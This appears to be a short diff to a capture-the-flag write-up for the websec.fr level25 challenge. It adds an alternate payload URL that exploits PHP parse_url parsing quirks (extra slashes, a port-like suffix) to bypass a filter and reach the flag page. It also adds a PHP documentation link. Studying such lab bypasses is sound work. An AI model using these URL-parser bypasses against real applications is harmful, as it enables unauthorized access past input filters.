@@ -126,10 +126,15 @@ Exploit url_parse function
 
 ```
 https://websec.fr/level25/index.php?page=flag&:1337
+
+OR
+
+https://websec.fr///level25/index.php?page=flag
 ```
 
 ```
 https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
+https://www.php.net/manual/en/function.parse-url.php#:~:text=parse_url(%22http%3A///example.com%22)%3B
 ```
 
 ```
